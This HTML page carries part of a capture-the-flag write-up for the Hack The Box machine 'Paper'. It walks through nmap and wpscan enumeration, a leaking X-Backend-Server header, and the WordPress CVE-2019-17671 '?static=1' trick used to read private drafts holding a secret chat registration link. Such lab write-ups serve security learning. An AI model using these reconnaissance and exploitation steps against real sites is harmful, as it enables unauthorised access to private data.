@@ -1,0 +1,1250 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Linux box.">
+    
+    <title>
+        
+            Paper | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Paper<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-16</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/paper/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#apache-port-80-tcp">Apache (port 80&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#http-headers">HTTP headers</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#office-paper-domain">office.paper domain</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#http-headers-1">HTTP headers</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#technology-lookup">Technology lookup</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#exploration">Exploration</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#wordpress">WordPress</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#foothold-cve-2019-17671">Foothold (CVE-2019-17671)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#retrieving-the-wordpress-drafts">Retrieving the WordPress drafts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#chat-office-paper-subdomain">chat.office.paper subdomain</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#recyclops">recyclops</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#path-traversal">Path traversal</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#lfi">LFI</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#exploring-hubot">Exploring hubot</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#ssh-port-22-tcp">SSH (port 22&#x2F;tcp)</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#distribution">Distribution</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#kernel">Kernel</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#apparmor">AppArmor</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#hostname">Hostname</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#local-groups">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#user-account-information">User account information</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#command-history">Command history</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#sudo-permissions">Sudo permissions</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#environment-variables">Environment variables</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#listening-ports">Listening ports</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#mongodb-port-27017-tcp">MongoDB (port 27017&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#databases">Databases</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#mysql-port-3306-tcp">MySQL (port 3306&#x2F;tcp)</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#processes">Processes</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#suid-binaries">SUID binaries</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#capabilities">Capabilities</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#les">LES</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#linpeas">Linpeas</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#privilege-escalation-cve-2021-3560">Privilege escalation (CVE-2021-3560)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#preparation">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#exploitation">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#local-enumeration-1">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2022-02-05</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/92926">secnigma</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.9</code>, while the target machine's IP address will be <code>10.10.11.143</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Paper using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.11.143<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">22/tcp  open  ssh
+</span><span class="z-text z-plain">80/tcp  open  http
+</span><span class="z-text z-plain">443/tcp open  https
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the services associated with the open ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.11.143<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,80,443<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE  VERSION
+</span><span class="z-text z-plain">22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+</span><span class="z-text z-plain">80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+</span><span class="z-text z-plain">443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on this service to see if they can find additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.11.143<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,80,443<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT    STATE SERVICE
+</span><span class="z-text z-plain">22/tcp  open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+</span><span class="z-text z-plain">|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+</span><span class="z-text z-plain">|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+</span><span class="z-text z-plain">80/tcp  open  http
+</span><span class="z-text z-plain">|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+</span><span class="z-text z-plain">| http-methods: 
+</span><span class="z-text z-plain">|_  Potentially risky methods: TRACE
+</span><span class="z-text z-plain">|_http-title: HTTP Server Test Page powered by CentOS
+</span><span class="z-text z-plain">443/tcp open  https
+</span><span class="z-text z-plain">|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+</span><span class="z-text z-plain">|_http-title: HTTP Server Test Page powered by CentOS
+</span><span class="z-text z-plain">| http-methods: 
+</span><span class="z-text z-plain">|_  Potentially risky methods: TRACE
+</span><span class="z-text z-plain">|_ssl-date: TLS randomness does not represent time
+</span><span class="z-text z-plain">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+</span><span class="z-text z-plain">| Subject Alternative Name: DNS:localhost.localdomain
+</span><span class="z-text z-plain">| Not valid before: 2021-07-03T08:52:34
+</span><span class="z-text z-plain">|_Not valid after:  2022-07-08T10:32:34
+</span><span class="z-text z-plain">| tls-alpn: 
+</span><span class="z-text z-plain">|_  http/1.1
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so <code>nmap</code>'s scans found that the HTTP title was the same on the two web servers. It indicates that these are 'HTTP Server Test Page powered by CentOS'...?</p>
+<p>Let's explore them.</p>
+<h2 id="apache-port-80-tcp">Apache (port <code>80/tcp</code>)</h2>
+<p>If we browse to <code>http://10.10.11.143/</code>, we see this web page:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/apache-homepage.png" alt="Apache homepage" /></p>
+<p>As we discovered in the last section, this website is the default installation page. There's not much to see here.</p>
+<h3 id="http-headers">HTTP headers</h3>
+<p>Let's check out the HTTP response headers when we request the homepage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl http://10.10.11.143/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HTTP/1.1 403 Forbidden
+</span><span class="z-text z-plain">Date: Fri, 15 Dec 2023 07:51:53 GMT
+</span><span class="z-text z-plain">Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+</span><span class="z-text z-plain">X-Backend-Server: office.paper
+</span><span class="z-text z-plain">Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
+</span><span class="z-text z-plain">ETag: &quot;30c0b-5c5c7fdeec240&quot;
+</span><span class="z-text z-plain">Accept-Ranges: bytes
+</span><span class="z-text z-plain">Content-Length: 199691
+</span><span class="z-text z-plain">Content-Type: text/html; charset=UTF-8
+</span></code></pre>
+<p>The <code>Server</code> header confirms what we discovered thanks to our previous scans. But the <code>X-Backend-Server</code> is really interesting though... Why is it set to <code>office.paper</code>?</p>
+<p>If we search online for this HTTP header, we find:</p>
+<blockquote>
+<p>The target website returns the <code>X-Backend-Server</code> header which includes potentially internal/hidden IP addresses or hostnames.</p>
+<p>— <a href="https://docs.gitlab.com/ee/user/application_security/dast/checks/16.4.html">GitLab</a></p>
+</blockquote>
+<p>Apparently, some proxy/load balancer providers reveal the <code>X-Backend-Server</code> header value by default, which discloses the IP or the hostname of the target website.</p>
+<h3 id="office-paper-domain"><code>office.paper</code> domain</h3>
+<p>Let's add this hostname at the end of our <code>/etc/hosts</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.143 office.paper<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">tee</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /etc/hosts</span>
+</span></code></pre>
+<p>Now, let's browse to <code>http://office.paper/</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/domain-homepage.png" alt="Domain homepage" /></p>
+<p>This time this is a real website!</p>
+<h3 id="http-headers-1">HTTP headers</h3>
+<p>Once again, let's check out the HTTP response headers when we request the homepage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl http://office.paper/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HTTP/1.1 200 OK
+</span><span class="z-text z-plain">Date: Fri, 15 Dec 2023 08:17:28 GMT
+</span><span class="z-text z-plain">Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+</span><span class="z-text z-plain">X-Powered-By: PHP/7.2.24
+</span><span class="z-text z-plain">Link: &lt;http://office.paper/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;
+</span><span class="z-text z-plain">X-Backend-Server: office.paper
+</span><span class="z-text z-plain">Content-Type: text/html; charset=UTF-8
+</span></code></pre>
+<p>The <code>Server</code> header is still the same. But this time there's also a <code>X-Powered-By</code> header indicating that PHP version <code>7.2.24</code> is in use, and also a <code>Link</code> header mentioning <code>wp-json</code>...? That's probably WordPress, we'll see.</p>
+<h3 id="technology-lookup">Technology lookup</h3>
+<p>While we're at it, let's look up the technologies used by this website with the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<p>It finds a lot of technologies, including Bootstrap which doesn't appear in this screenshot. It confirms what we already knew, and what we suspected: this website is indeed using Wordpress.</p>
+<h3 id="exploration">Exploration</h3>
+<p>It looks like it's a blog for the Blunder Tiffinc Inc., 'The best paper company in the eletric-city Scranton!'. There's a few blog posts written by <code>Prisonmike</code>: in the first one he declares that he added all of his friends on this blog, and in the last one he says that <code>Jan</code> forced him to remove all of them.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/domain-latest-blog-post-description.png" alt="Domain latest blog post decription" /></p>
+<p>There's also the possiblity of leaving comments on blog posts once logged in. Let's check the comments on the latest blog post.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/domain-latest-blog-post-comments.png" alt="Domain latest blog post comments" /></p>
+<p>That's interesting! According to <code>nick</code>'s comment, there's some secret content in Michael's drafts.</p>
+<h3 id="wordpress">WordPress</h3>
+<p>If we look at the footer of this website, we see that it links to <a href="https://wordpress.com/">WordPress</a>, and that it's 'Proudly Powered By WordPress'. This corroborates what we discovered in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#http-headers-1">HTTP headers</a> and <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#technology-lookup">Technology lookup</a> sections.</p>
+<p>That's a great news for us, since WordPress has a wealth of plugins vulnerable to various exploits. So if one of these plugins is used by this website, we should be able to exploit it to gain additional knowledge.</p>
+<p>Let's run <code>wpscan</code> to check for WordPress issues.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> wpscan<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>url</span> http://office.paper/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>api-token</span> <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">TOKEN</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
+</span><span class="z-text z-plain"> | Found By: Rss Generator (Passive Detection)
+</span><span class="z-text z-plain"> |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
+</span><span class="z-text z-plain"> |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
+</span><span class="z-text z-plain"> |
+</span><span class="z-text z-plain"> | [!] 57 vulnerabilities identified:
+</span><span class="z-text z-plain"> |
+</span><span class="z-text z-plain"> | &lt;SNIP&gt;
+</span><span class="z-text z-plain"> |
+</span><span class="z-text z-plain"> | [!] Title: WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts
+</span><span class="z-text z-plain"> |     Fixed in: 5.2.4
+</span><span class="z-text z-plain"> |     References:
+</span><span class="z-text z-plain"> |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
+</span><span class="z-text z-plain"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
+</span><span class="z-text z-plain"> |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+</span><span class="z-text z-plain"> |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+</span><span class="z-text z-plain"> |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
+</span><span class="z-text z-plain"> |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
+</span><span class="z-text z-plain"> |
+</span><span class="z-text z-plain"> | &lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] WordPress theme in use: construction-techup
+</span><span class="z-text z-plain"> | Location: http://office.paper/wp-content/themes/construction-techup/
+</span><span class="z-text z-plain"> | Last Updated: 2022-09-22T00:00:00.000Z
+</span><span class="z-text z-plain"> | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
+</span><span class="z-text z-plain"> | [!] The version is out of date, the latest version is 1.5
+</span><span class="z-text z-plain"> | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
+</span><span class="z-text z-plain"> | Style Name: Construction Techup
+</span><span class="z-text z-plain"> | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
+</span><span class="z-text z-plain"> | Author: wptexture
+</span><span class="z-text z-plain"> | Author URI: https://testerwp.com/
+</span><span class="z-text z-plain"> |
+</span><span class="z-text z-plain"> | Found By: Css Style In Homepage (Passive Detection)
+</span><span class="z-text z-plain"> |
+</span><span class="z-text z-plain"> | Version: 1.1 (80% confidence)
+</span><span class="z-text z-plain"> | Found By: Style (Passive Detection)
+</span><span class="z-text z-plain"> |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: &#39;Version: 1.1&#39;
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It found 57 vulnerabilities, but <code>Unauthenticated View Private/Draft Posts</code> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17671">CVE-2019-17671</a>) caught my attention, since we know that Michael has some secrets in his drafts.</p>
+<h1 id="foothold-cve-2019-17671">Foothold (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17671">CVE-2019-17671</a>)</h1>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17671">CVE-2019-17671</a> is a vulnerability affecting WordPress verions prior to 5.2.4 that allows unauthenticated users to view certain protected content. The vulnerability is caused by a mishandling of the static query property in the WordPress core. This allows attackers to bypass authentication and view protected content such as drafts, private posts, or even deleted content.</p>
+<h2 id="retrieving-the-wordpress-drafts">Retrieving the WordPress drafts</h2>
+<p><a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">This blog</a> explains why this issue arises, and how to exploit it. In fact, it's extremely easy: we simply have to browse to <code>http://office.paper/?static=1</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/domain-private-blog-posts-drafts.png" alt="Domain private blog posts and drafts" /></p>
+<p>Apparently, the users were removed from this website for security reasons. It was a public blog, so the higher officials preferred migrating to a private chat system.</p>
+<p>There's also a 'Secret Registration URL of new Employee chat system': <code>http://chat.office.paper/register/8qozr226AhkCHZdyY</code>. That's interesting! The <code>chat.office.paper</code> subdomain is new.</p>
+<p>We can also see that Nick is one again blaming Michael for saving secrets in drafts files, but Michael thinks that 'unpublished drafts cannot be accessed by outsiders'.</p>
+<h2 id="chat-office-paper-subdomain"><code>chat.office.paper</code> subdomain</h2>
+<p>We discovered a new subdomain, so let's add it to our <code>/etc/hosts</code> file.</p>
